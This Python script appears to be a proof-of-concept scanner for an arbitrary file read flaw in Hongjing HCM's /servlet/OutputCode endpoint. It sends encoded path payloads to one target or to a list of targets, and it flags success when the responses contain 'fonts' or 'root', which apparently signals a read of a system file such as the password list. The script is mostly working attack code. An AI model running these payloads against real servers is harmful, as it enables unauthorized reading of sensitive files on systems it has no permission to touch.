#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : 浅梦安全
import requests
import argparse
from requests.exceptions import RequestException
from urllib3.exceptions import InsecureRequestWarning

# 打印颜色
RED = '\033[91m'
RESET = '\033[0m'
# 禁用不安全请求警告
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def check_vulnerability(url):
    try:
        # 构建攻击URL
        attack_url = url.rstrip('/') + "/servlet/OutputCode?path=MrEzLLE8pPjFvPfyPAATTP2HJFPAATTPTwqF7eJiXGeHU4B"
        attack_url2 = url.rstrip('/') + "/servlet/OutputCode?path=RNcrjWtNfJnkUMbX1UB6VAPAATTP3HJDPAATTPPAATTP3HJDPAATTP"
  	
        # 向服务器发送请求
        response = requests.get(attack_url, verify=False, timeout=10)
        response2 = requests.get(attack_url2, verify=False, timeout=10)
  
        # 检查响应状态码和响应体中的关键字
        vulnerability_found = False
        if response.status_code == 200 and 'fonts' in response.text:
            vulnerability_found = True
        elif response2.status_code == 200 and 'root' in response2.text:
            vulnerability_found = True

        if vulnerability_found:
            print(f"{RED}URL [{url}] 宏景HCM OutputCode 任意文件读取漏洞。{RESET}")
        else:
            print(f"URL [{url}] 未发现漏洞。")
    except RequestException as e:
        print(f"URL [{url}] 请求失败: {e}")

def main():
    parser = argparse.ArgumentParser(description='检查目标URL是否存在宏景HCM OutputCode 任意文件读取漏洞。')
    parser.add_argument('-u', '--url', help='指定目标URL')
    parser.add_argument('-f', '--file', help='指定包含多个目标URL的文本文件')

    args = parser.parse_args()

    if args.url:
        # 如果URL未以http://或https://开头，则添加http://
        args.url = "http://" + args.url.strip("/") if not args.url.startswith(("http://", "https://")) else args.url
        check_vulnerability(args.url)
    elif args.file:
        with open(args.file, 'r') as file:
            urls = file.read().splitlines()
            for url in urls:
                url = "http://" + url.strip("/") if not url.startswith(("http://", "https://")) else url
                check_vulnerability(url)

if __name__ == '__main__':
    main()
